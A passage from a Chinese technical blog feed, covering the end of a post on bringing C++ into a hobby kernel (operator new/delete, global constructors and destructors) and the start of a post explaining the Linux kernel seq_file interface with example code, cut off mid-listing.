class="hljs-number">1</span>) &#123;    <span class="hljs-comment">/* on full list */</span><br>            <span class="hljs-built_in">list_del</span>(&amp;page-&gt;list);<br>            <span class="hljs-built_in">list_add_next</span>(&amp;<span class="hljs-keyword">this</span>-&gt;full, &amp;page-&gt;list);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (page-&gt;obj_nr == <span class="hljs-keyword">this</span>-&gt;page_obj_nr) &#123;   <span class="hljs-comment">/* all freed */</span><br>            <span class="hljs-built_in">list_del</span>(&amp;page-&gt;list);<br>            <span class="hljs-built_in">put_page</span>(page);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x04-C-的初步引入"><a href="#0x04-C-的初步引入" class="headerlink" title="0x04. C++ 的初步引入"></a>0x04. C++ 的初步引入</h1><p>现在我们考虑进行 C++ 代码的引入，笔者选择引入 C++ 代码的主要原因是为了 OOP 特性，虽然说使用 C 同样可以编写面向对象的代码，但是总归没有 C++ 的原生 OOP 看起来那么直观</p><p>在 bare bone 环境下，我们 <strong>无法使用标准库</strong> ，因此此时的 C++ <em>几乎</em> 是相当于 C with class,不过额外多了一些特性：</p><ul><li>隐式的对构造函数与析构函数的调用</li><li>隐式的内存分配与释放</li></ul><p>对于构造函数与析构函数的自动调用，这是由编译器去决定的，因此大部分情况下我们可以不用处理， <strong>除了全局对象的构造函数</strong> —— <strong>我们应当确保其在我们完成内存管理子系统的初始化之后再进行</strong></p><p>对于隐式的内存分配与释放，我们只需要 <strong>重载全局 new&#x2F;delete 运算符即可</strong></p><p>此外，我们应当 <strong>禁用 C++ 的异常处理机制</strong> ，因为这个特性在内核上下文不好实现，同时会引入很多额外的开销，我们通过在编译时添加 <code> -fno-exceptions</code> 以关闭该特性</p><h2 id="new-delete-运算符的重载"><a href="#new-delete-运算符的重载" class="headerlink" title="new&#x2F;delete 运算符的重载"></a>new&#x2F;delete 运算符的重载</h2><p><code>new/delete</code> 运算符重载的方式比较简单，我们只需要在某个文件中实现这些运算符重载，在其中调用内存分配的 API 即可：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;closureos/cpp_base.hpp&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;closureos/errno.h&gt;</span></span><br><br><span class="hljs-keyword">import</span> kernel.lib;<br><span class="hljs-keyword">import</span> kernel.mm;<br><br><span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(<span class="hljs-type">size_t</span> sz)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> mm::GloblKHeapPool-&gt;<span class="hljs-built_in">Malloc</span>(sz);<br>&#125;<br><br><span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>[](<span class="hljs-type">size_t</span> sz)<br>&#123;<br>    <span class="hljs-keyword">return</span> mm::GloblKHeapPool-&gt;<span class="hljs-built_in">Malloc</span>(sz);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-type">void</span> *p)</span> <span class="hljs-keyword">noexcept</span></span><br><span class="hljs-function"></span>&#123;<br>    mm::GloblKHeapPool-&gt;<span class="hljs-built_in">Free</span>(p);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-keyword">delete</span>[](<span class="hljs-type">void</span> *p) <span class="hljs-keyword">noexcept</span><br>&#123;<br>    mm::GloblKHeapPool-&gt;<span class="hljs-built_in">Free</span>(p);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-type">void</span> *p, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sz)</span> <span class="hljs-keyword">noexcept</span></span><br><span class="hljs-function"></span>&#123;<br>    mm::GloblKHeapPool-&gt;<span class="hljs-built_in">Free</span>(p);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-keyword">delete</span>[](<span class="hljs-type">void</span> *p, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sz) <span class="hljs-keyword">noexcept</span><br>&#123;<br>    mm::GloblKHeapPool-&gt;<span class="hljs-built_in">Free</span>(p);<br>&#125;<br></code></pre></td></tr></table></figure><p>之后对于所有的 C++ 代码，在链接时编译器会自动寻找到这些运算符定义</p><h2 id="global-constructor-的调用"><a href="#global-constructor-的调用" class="headerlink" title="global constructor 的调用"></a>global constructor 的调用</h2><p>在用户态程序中对于全局初始化器（例如全局对象的构造函数，或是 constructor attribute 修饰的函数）的调用通常在 <code>main()</code> 函数前完成（这里我们仅考虑 <code>GCC</code> 编译器），编译器会生成对应的 <strong>调用构造器与析构器的函数</strong> （通常每个文件一个，函数名中带有 <code>static_initialization_and_destruction</code> ），并将这些函数的地址单独存放到一个 <code>.init_array</code> 段，在运行 <code>main()</code> 函数前的 <code>__libc_start_main()</code> 会调用这些函数指针</p><p>因此对于我们的 kernel 环境而言，若要初始化这些全局对象， <strong>我们只需要手动调用这些函数指针即可</strong> ，这里笔者将 <code>.init_array</code> 段放在了 <code>.data</code> 段中，并使用一个外部符号标识其位置：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haskell">.<span class="hljs-class"><span class="hljs-keyword">data</span> <span class="hljs-type">ALIGN</span>(4096) : <span class="hljs-type">AT</span> (<span class="hljs-title">__kernel_text_sz</span> + <span class="hljs-title">__boot_end</span>)</span><br>&#123;<br>*(.<span class="hljs-class"><span class="hljs-keyword">data</span>)</span><br>__init_array = .;<br>*(.init_array)<br></code></pre></td></tr></table></figure><p>之后我们直接引入该符号并调用对应的函数指针即可：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-title">int</span> <span class="hljs-params">(*__init_array)</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-title">int</span> <span class="hljs-params">(*__init_array_end)</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br><span class="hljs-comment">/* ... */</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">global_constructor_caller</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">int</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">int</span> (**init_array)(<span class="hljs-type">void</span>) = &amp;__init_array;<br>    <span class="hljs-built_in">int</span> (**init_array_end)(<span class="hljs-type">void</span>) = &amp;__init_array_end;<br>    <span class="hljs-type">int</span> error;<br><br>    <span class="hljs-keyword">for</span> (base::<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; init_array[i] &amp;&amp; ((init_array + i) &lt; init_array_end); i++) &#123;<br>        error = init_array[i]();<br>        <span class="hljs-keyword">if</span> (error) &#123;<br>            <span class="hljs-keyword">return</span> error;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="global-destructor-的调用"><a href="#global-destructor-的调用" class="headerlink" title="global destructor 的调用"></a>global destructor 的调用</h2><p>全局析构器的实现则比构造器相对复杂一些，对每个存在全局构造器&#x2F;析构器的文件的 <code>*_static_initialization_and_destruction_*()</code> 函数，其除了调用构造器以外，还会 <strong>进行析构器信息的装填</strong> ，这通过 <code>int __cxa_atexit(void (*destructor) (void *), void *arg, void *__dso_handle)</code> 函数完成，其三个参数分别为：析构函数指针、待析构对象、一个特殊的标记值（对我们来说可以不用管）</p><p>因此我们只需要自行实现一个 <code>__cxa_at_exit</code> 函数来记录析构器信息即可，为了实现动态的析构器数据记录，我们动态分配 <code>dtor_info</code> 结构体来记录待析构对象的信息，并将其链接为单向链表：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> &#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> *next;<br>    <span class="hljs-built_in">void</span> (*destructor) (<span class="hljs-type">void</span> *);<br>    <span class="hljs-type">void</span> *arg;<br>    <span class="hljs-type">void</span> *__dso_handle;<br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> *global_dtors = <span class="hljs-literal">nullptr</span>;<br><br><span class="hljs-type">int</span> __cxa_atexit(<span class="hljs-built_in">void</span> (*destructor) (<span class="hljs-type">void</span> *), <span class="hljs-type">void</span> *arg, <span class="hljs-type">void</span> *__dso_handle)<br>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> *new_info;<br>    <br>    new_info = <span class="hljs-keyword">new</span> <span class="hljs-keyword">struct</span> dtor_info;<br>    <span class="hljs-keyword">if</span> (new_info == <span class="hljs-literal">nullptr</span>) &#123;<br>        <span class="hljs-keyword">return</span> -ENOMEM;<br>    &#125;<br><br>    new_info-&gt;next = global_dtors;<br>    new_info-&gt;destructor = destructor;<br>    new_info-&gt;arg = arg;<br>    new_info-&gt;__dso_handle = __dso_handle;<br><br>    global_dtors = new_info;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>此外，我们还需要定义一个 <code>__dso_handle</code> 变量，并导出到我们的 <code>cpp_base.hpp</code> 中：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">void</span>* __dso_handle __attribute__((<span class="hljs-built_in">visibility</span>(<span class="hljs-string">&quot;hidden&quot;</span>)));<br></code></pre></td></tr></table></figure><p>接下来是对析构器的调用，在 C++ ABI 规范中，对这些析构器的调用应当由 <code>void __cxa_finalize ( void *__dso_handle)</code> 函数完成，其应当将析构器条目的 <code>__dso_handle</code> 与其参数进行对比，相等则调用析构器（若传参为空则应当调用所有析构器）并将对应的条目无效化，因此在我们的 ClosureOS 内核中也应当实现一个 <code>__cxa_finalize()</code> 函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp">lib::atomic::SpinLock dtor_exit_lock;<br><br><span class="hljs-type">void</span> __cxa_finalize(<span class="hljs-type">void</span>* dso_handle)<br>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> **pdtor = &amp;global_dtors;<br><br>    dtor_exit_lock.<span class="hljs-built_in">Lock</span>();<br><br>    <span class="hljs-keyword">while</span> (*pdtor) &#123;<br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> *dtor = *pdtor;<br><br>        <span class="hljs-keyword">if</span> (!dso_handle || dtor-&gt;__dso_handle == dso_handle) &#123;<br>            *pdtor = dtor-&gt;next;<br>            dtor-&gt;<span class="hljs-built_in">destructor</span>(dtor-&gt;arg);<br>            <span class="hljs-keyword">delete</span> dtor;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            pdtor = &amp;dtor-&gt;next;<br>        &#125;<br>    &#125;<br><br>    dtor_exit_lock.<span class="hljs-built_in">UnLock</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>需要注意的是 <strong>这个函数应当在程序退出时进行手动调用</strong> ，由于我们尚未编写电源管理模块，因此本章所涉及的代码不会调用该函数</p><h2 id="纯虚函数"><a href="#纯虚函数" class="headerlink" title="纯虚函数"></a>纯虚函数</h2><p>虚函数是 C++ 的一个特性，简而言之其中的纯虚函数是一个类似占位符的存在，当程序调用纯虚函数时程序会报错，在内核环境中我们并没有各种库因此我们需要实现相应的 error handler</p><p>对于 GCC 而言，这个 error handler 应当为 <code>__cxa_pure_virtual()</code> 函数，因此我们只需要在我们的内核中实现该函数即可， <em>目前我们暂且留空</em> ，在后续完成内核输出功能后再添加上类似 <code>printk()</code> 的报错信息输出：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-type">void</span> __cxa_pure_virtual()<br>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">TODO:</span> add error message output</span><br><span class="hljs-comment">    */</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF. Reference"></a>0xFF. Reference</h1><p><a href="https://arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/">【OS.0x03】Linux内核内存管理II - Buddy System</a></p><p><a href="https://arttnba3.cn/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/">【OS.0x04】Linux 内核内存管理浅析 III - Slub Allocator</a></p><p><a href="https://blogs.oracle.com/linux/post/linux-slub-allocator-internals-and-debugging-1">Linux SLUB Allocator Internals and Debugging, Part 1 of 4</a></p><p><a href="https://wiki.osdev.org/C++">C++ - OS Dev</a></p><p><a href="https://wiki.osdev.org/Calling_Global_Constructors">Calling Global Constructors - OS Dev</a></p><p><a href="https://itanium-cxx-abi.github.io/cxx-abi/abi.html">Itanium C++ ABI</a></p><p> <a href="https://refspecs.linuxfoundation.org/elf/elf.pdf">Linux Foundation - Executable and Linking Format (ELF) Specification</a> </p><p><a href="https://www.amd.com/content/dam/amd/en/documents/processor-tech-docs/programmer-references/24593.pdf">AMD64 Architecture Programmer’s Manual Volume 2</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Good old MEMORIES has gone…&lt;/p&gt;</summary>
    
    
    
    <category term="CODE" scheme="https://arttnba3.github.io/categories/CODE/"/>
    
    
    <category term="开发手记" scheme="https://arttnba3.github.io/tags/%E5%BC%80%E5%8F%91%E6%89%8B%E8%AE%B0/"/>
    
    <category term="操作系统" scheme="https://arttnba3.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="内存管理" scheme="https://arttnba3.github.io/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
    <category term="C++" scheme="https://arttnba3.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【OS.0x05】Linux 内核文件系统 - 初探序列文件接口</title>
    <link href="https://arttnba3.github.io/2024/05/31/OS-0X05-LINUX-KERNEL-FILESYSTEM-SEQFILE/"/>
    <id>https://arttnba3.github.io/2024/05/31/OS-0X05-LINUX-KERNEL-FILESYSTEM-SEQFILE/</id>
    <published>2024-05-30T21:36:25.000Z</published>
    <updated>2024-08-19T06:25:57.624Z</updated>
    
    <content type="html"><![CDATA[<p>真是序序又列列啊，你们有没有这样的文件接口啊我想问</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>笔者大二上那会学 kernel pwn 时便经常在用户态用到序列文件接口，不过在那个时候笔者只关心打开 <code>/proc/self/stat</code> 文件便能分配一个 <code>kmalloc-32</code> 对象（<code>seq_operations</code> ）；大二下写 Linux kernel rootkit 时又碰到 <code>/proc/kallsyms</code> 无法在内核层读取的问题，不过也是了解了一下序列文件接口的相关知识就没有再继续深入了（<del>不过这个东西本来就很简约，就其本身而言确实没有什么能够深入的地方</del>）</p><p>刚好笔者最近的工作又接触到了这个玩意，所以简单写一篇博客记录一下这是个什么玩意：）</p><h1 id="0x01-序列文件接口-简介"><a href="#0x01-序列文件接口-简介" class="headerlink" title="0x01. 序列文件接口 - 简介"></a>0x01. 序列文件接口 - 简介</h1><p><a href="https://docs.kernel.org/filesystems/seq_file.html">序列文件接口</a> 是在现有 VFS 上建立的一套用于 <strong>从内核空间向用户空间提供传输序列数据</strong> 的接口，这里我们将序列数据简单定义为 <strong>由多条数据组成的数据</strong> （例如 <code>/proc/kallsyms</code> 为用户提供了多条内核符号信息数据），这个场景下内核通常需要多次迭代地向用户空间拷贝多条数据</p><p>序列文件接口的设计主要出于一个原因：<strong>【大于一页的文件操作对于开发者而言非常麻烦】</strong> ，我们要从内核空间向用户空间传递数据通常需要自行创建如 <code>procfs</code> 等节点并自定义一份 <code>file_operations</code> ，开发者能用的只有一个裸的 <code>read(struct file *, char __user *, size_t, loff_t *)</code> ，而对于这类功能比较单一的场景， <em>设计上要考虑的和常规的文件接口相比却一个都不能少</em> （跨页多条数据拷贝的文件偏移处理确实不是个小问题），这增大了开发者的开发难度，但序列数据的传输在内核开发中其实又是一个非常常见的场景</p><p>由此，针对此类场景，序列文件接口应运而生，<strong>为上层开发者提供了类似【迭代器】的简易文件读取接口</strong> ，由此极大地简化了对于此类场景的内核开发工作</p><blockquote><p>本篇博客使用的内核源码为 6.9.1</p></blockquote><h2 id="序列文件接口开发：操作函数"><a href="#序列文件接口开发：操作函数" class="headerlink" title="序列文件接口开发：操作函数"></a>序列文件接口开发：操作函数</h2><p>要使用序列文件接口，我们需要实现一个 <code>seq_operations</code> 函数表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seq_file.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br><span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos);<br><span class="hljs-type">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br><span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos);<br><span class="hljs-type">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure><p>各函数指针说明如下（<strong>按照被调用顺序</strong>）：</p><ul><li><code>start</code> ：在开始读取序列数据前进行初始化工作，并返回指定偏移上的序列数据对象</li><li><code>show</code> ：打印传入的序列数据对象，该函数会被循环调用</li><li><code>next</code> ： 根据传入的偏移值与当前对象获取下一个序列数据对象，并自增偏移值，该函数会被循环调用</li><li><code>stop</code> ：在完成对序列文件的遍历后用以进行需要的收尾工作，可以为空函数</li></ul><p>需要注意的是，这里所说的偏移值通常指的 <strong>其实是序列数据对象的索引值</strong> ，而非基于具体内存对象大小计算的值</p><p>除了 <code>seq_operations</code> 函数表以外，序列文件接口对于每个文件还会额外分配一个 <code>seq_file</code> 结构体（在 open() 时分配到 <code>file-&gt;private</code> ）用以存储如当前的读取偏移、整个序列的长度等数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> &#123;</span><br><span class="hljs-type">char</span> *buf;<br><span class="hljs-type">size_t</span> size;<br><span class="hljs-type">size_t</span> from;<br><span class="hljs-type">size_t</span> count;<br><span class="hljs-type">size_t</span> pad_until;<br><span class="hljs-type">loff_t</span> index;<br><span class="hljs-type">loff_t</span> read_pos;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">lock</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> *<span class="hljs-title">op</span>;</span><br><span class="hljs-type">int</span> poll_event;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br><span class="hljs-type">void</span> *private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>核心的字段说明如下：</p><ul><li><code>buf</code> ：临时存放由 <code>show()</code> 打印的数据，通常为单张内存页大小，数据会先被拷贝到这块内存上再拷贝回用户空间</li><li><code>size</code> ：<code>buf</code> 的总大小</li><li><code>from</code>：<code>buf</code> 当前数据写入的起始偏移</li><li><code>count</code> ：<code>buf</code> 已经写入的大小，<strong>序列文件上的有效待写入数据为</strong> <code>&amp;seq_file::buf[seq_file::from]</code> <strong>起始的长度为</strong> <code>seq_file::count</code> <strong>的区域</strong> ，通常每一轮读取都会刷新一次 <code>count</code> 字段</li><li><code>index</code> ： 当前正在读取的对象的偏移值</li><li><code>read_pos</code> ：成功读取的数据量（字节）</li><li><code>op</code> ：序列文件接口的函数表 <del>其实是指玩原神的人</del> </li><li><code>file</code> ：对应的 VFS file 节点</li><li><code>private</code> ：供上层开发者存放私人数据</li></ul><p>下面我们以一个基础的链表结构作为示例说明如何基于序列文件接口进行基本的开发：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0x100</span>];<br>&#125;;<br><br>LIST_HEAD(a3_seq_list);<br></code></pre></td></tr></table></figure><h3 id="start-：序列文件读取初始化"><a href="#start-：序列文件读取初始化" class="headerlink" title="start()：序列文件读取初始化"></a>start()：序列文件读取初始化</h3><p>内核将单次 <code>read()</code> 系统调用读取的过程称之为一个 <code>session</code> ，在每个 session 开始时都会调用序列文件接口的 <code>start()</code> 函数以进行初始化，核心作用是 <strong>在读取开始时获取指定偏移值上的对象作为起始点</strong> ，我们通常需要返回<strong>指定偏移上的序列数据对象</strong></p><p>在现代内核及驱动开发场景中 <code>start()</code> 所获取到的通常是第一个序列数据对象，这也是序列文件接口的规范用法， <em>因为大部分情况下开发者并不需要处理偏移值不为 0 的场景</em> ，因此也可以简单返回一个  <code>SEQ_START_TOKEN</code>  （值为 1）</p><blockquote><p>该值用于在 <code>next()</code> 与 <code>show()</code> 中<strong>供你自己进行识别</strong>，所以只要你认得就行</p></blockquote><p>对于读取到末尾的情况（偏移值超出范围）， <strong>通常直接返回 NULL 即可</strong> ，对于初始化失败的场景，我们还可以返回一个 <code>ERR_PTR</code> 类型值进行说明</p><p>以下是我们的示例代码，这里我们简单地返回链表上指定偏移的对象：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">a3kmod_seq_start</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">ptr</span>;</span><br>    <span class="hljs-type">loff_t</span> cpos = <span class="hljs-number">0</span>;<br><br>    list_for_each_entry(ptr, &amp;a3_seq_list, <span class="hljs-built_in">list</span>) &#123;<br>        <span class="hljs-keyword">if</span> (cpos == (*ppos)) &#123;<br>            <span class="hljs-keyword">return</span> ptr;<br>        &#125;<br><br>        cpos++;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="show-：打印指定的序列数据"><a href="#show-：打印指定的序列数据" class="headerlink" title="show()：打印指定的序列数据"></a>show()：打印指定的序列数据</h3><p><code>show()</code> 函数用于将当前序列对象需要被导出的数据通过序列文件的打印接口拷贝到指定的临时内存（即 <code>seq_file::buf</code> ）上，这些数据会在多次遍历完成后（buf 满了或者序列遍历完成）统一拷贝到用户空间，可用的接口通常有：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* print data directly */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">seq_printf</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *fmt, ...)</span>; <span class="hljs-comment">/* mostly used */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">seq_putc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">char</span> c)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">seq_puts</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">seq_escape</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *esc)</span>;<br><span class="hljs-comment">/* print file path */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">seq_path</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> path *path,</span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *esc)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">seq_path_root</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> path *path,</span><br><span class="hljs-params">                  <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> path *root, <span 